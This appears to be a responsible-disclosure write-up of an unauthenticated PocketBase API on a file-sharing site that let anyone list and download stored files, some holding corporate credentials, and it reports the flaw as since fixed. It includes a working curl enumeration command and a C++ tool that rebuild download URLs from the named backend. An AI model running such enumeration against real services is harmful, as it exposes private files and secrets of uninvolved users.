Exposed Corporate Data on File Sharing Platform

Security analysis of fs.sujal.xyz: how an unauthenticated API endpoint exposed stored files, including internal corporate credentials and configurations.

Context & Background

fs.sujal.xyz is a lightweight web-based file-sharing platform widely used among university students and colleagues to transfer coursework, project archives, and documents. Due to its simplicity and fast upload speeds, it served as a convenient digital transfer tool for many users.

However, a review of the platform's access control architecture revealed a fundamental vulnerability. While the user interface presented an access code prompt before allowing users to download shared files, this barrier was enforced solely on the frontend. The underlying database API lacked access-control rules, permitting direct enumeration and retrieval of stored file records.

Vulnerability Analysis

The platform utilizes PocketBase as its backend datastore. When an upload occurs:

  • The file object is stored in backend storage
  • A unique record identifier is generated
  • The record is linked to a user-defined access code

While this architecture appears sufficient from a user perspective, inspecting network activity during normal usage revealed that backend API endpoints were accessible without authentication.

Unauthenticated API Enumeration

When verifying whether a chosen code is available during upload, the frontend makes an HTTP GET request:

https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=1&filter=unique="2151"&skipTotal=1

Because access rules on the files collection permitted public read operations, querying the collection without filters returned stored records directly: 

curl -s "https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=100" \
| jq -r '.items[] | "\(.collectionId) \(.id) \(.file[0])"'

Result: The API returned records containing collectionId, id, and filename. With these attributes, direct download URLs could be reconstructed for any stored file without requiring access codes, user authentication, or session tokens.

Automated URL Reconstruction in C++

To demonstrate the systematic impact of the unauthenticated endpoint, a C++ utility was written to parse records and generate direct download URLs:

#include <iostream>
#include <string>
#include <sstream>
#include <array>
#include <vector>

using namespace std;

const string base_url = "https://sujal.pockethost.io/api";

string run(const string& command) {
    array<char, 256> buffer{};
    string output;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Error: cannot run command\n";
        return "";
    }
    while (fgets(buffer.data(), buffer.size(), pipe)) {
        output += buffer.data();
    }
    pclose(pipe);
    if (!output.empty() && output.back() == '\n')
        output.pop_back();
    return output;
}

int main() {
    string records_output = run(
        "curl -s \"https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=100\" "
        "| jq -r '.items[] | \"\\(.collectionId) \\(.id) \\(.file[])\"'"
    );

    stringstream ss(records_output);
    string line;
    vector<string> urls;

    while (getline(ss, line)) {
        stringstream ls(line);
        string collection_id, record_id, filename;
        ls >> collection_id >> record_id >> filename;

        if (!collection_id.empty() && !record_id.empty() && !filename.empty()) {
            string full_url = base_url + "/files/" + collection_id + "/" + record_id + "/" + filename;
            urls.push_back(full_url);
        }
    }

    for (size_t i = 0; i < urls.size(); ++i) {
        cout << "[" << (i + 1) << "] " << urls[i] << "\n";
    }

    return 0;
}

Impact Assessment & Exposed Credentials

To evaluate the scope of exposure and assess risk to users, a security review of the accessible records was conducted. In addition to personal academic files, analysis revealed that several users had utilized the service for workplace and internal development file transfers. As a consequence, critical enterprise configurations, operational tokens, and database credentials were inadvertently exposed in plaintext.

Notice: The affected companies were promptly notified of the exposure. All credentials, access tokens, and secrets identified during the assessment have since been rotated and revoked.

Resolution and Remediation

The platform maintainer acknowledged the report and promptly initiated remediation steps. The vulnerability was reported, addressed, and successfully fixed through the following measures:

  • Access Control Hardening: Unauthenticated listing of collection records was disabled on the PocketBase backend, preventing unauthorized record queries.
  • Row-Level Security: Access policies were implemented requiring individual file identifiers for record lookup rather than bulk enumeration.
  • Payload Encryption: Client-side file encryption was developed and deployed in follow-up iterations, ensuring files stored on the server remain encrypted at rest.

Additionally, notifications sent to the affected companies allowed security teams to revoke the exposed credentials, audit access logs, and ensure that internal systems were fully safeguarded.
